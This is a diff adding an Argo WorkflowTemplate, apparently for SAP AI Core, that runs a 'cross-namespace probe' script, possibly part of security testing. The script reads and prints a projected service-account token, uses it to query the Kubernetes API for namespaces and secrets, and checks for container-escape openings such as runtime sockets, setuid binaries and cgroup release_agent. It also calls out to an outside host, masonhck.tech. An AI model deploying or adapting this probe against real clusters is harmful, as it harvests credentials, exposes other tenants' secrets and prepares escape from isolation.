@@ -1,0 +1,61 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: xns-probe
+  annotations:
+    scenarios.ai.sap.com/description: "Cross-NS probe"
+    scenarios.ai.sap.com/name: "bb14-scenario"
+    executables.ai.sap.com/description: "Cross-NS probe"
+    executables.ai.sap.com/name: "xns-probe"
+  labels:
+    scenarios.ai.sap.com/id: "bb14-scenario"
+    executables.ai.sap.com/id: "xns-probe"
+    ai.sap.com/version: "1.0.0"
+spec:
+  entrypoint: main
+  volumes:
+  - name: projected-token
+    projected:
+      sources:
+      - serviceAccountToken:
+          path: token
+          expirationSeconds: 3600
+          audience: api
+  templates:
+  - name: main
+    metadata:
+      labels:
+        ai.sap.com/resourcePlan: starter
+    container:
+      image: nicolaka/netshoot:latest
+      volumeMounts:
+      - name: projected-token
+        mountPath: /var/run/projected
+      command:
+      - bash
+      - -c
+      - |
+        echo "=== XNS PROBE ==="
+        echo "NS: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo unknown)"
+        
+        echo "=== PROJECTED TOKEN ==="
+        ls -la /var/run/projected/ 2>/dev/null || echo "No projected mount"
+        PTOKEN=$(cat /var/run/projected/token 2>/dev/null)
+        echo "Token len: ${#PTOKEN}"
+        if [ -n "$PTOKEN" ]; then
+          echo "TOKEN: $(echo $PTOKEN | head -c 200)..."
+          echo "=== K8S API WITH PROJECTED TOKEN ==="
+          curl -sk -H "Authorization: Bearer $PTOKEN" https://kubernetes.default.svc/api/v1/namespaces 2>&1 | head -c 500
+          echo ""
+          curl -sk -H "Authorization: Bearer $PTOKEN" https://kubernetes.default.svc/api/v1/secrets 2>&1 | head -c 500
+        fi
+        
+        echo "=== ESCAPE CHECKS ==="
+        find / -perm -4000 2>/dev/null | head -5
+        ls /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null || echo "No sockets"
+        mount | grep -E "var/log|docker|containerd|kubelet" | head -5
+        cat /proc/self/uid_map 2>/dev/null
+        cat /sys/fs/cgroup/release_agent 2>/dev/null || echo "No release_agent"
+        
+        curl -s "https://www.masonhck.tech/ssrf.php?src=xns-probe" | head -c 10
+        echo "=== XNS DONE ==="
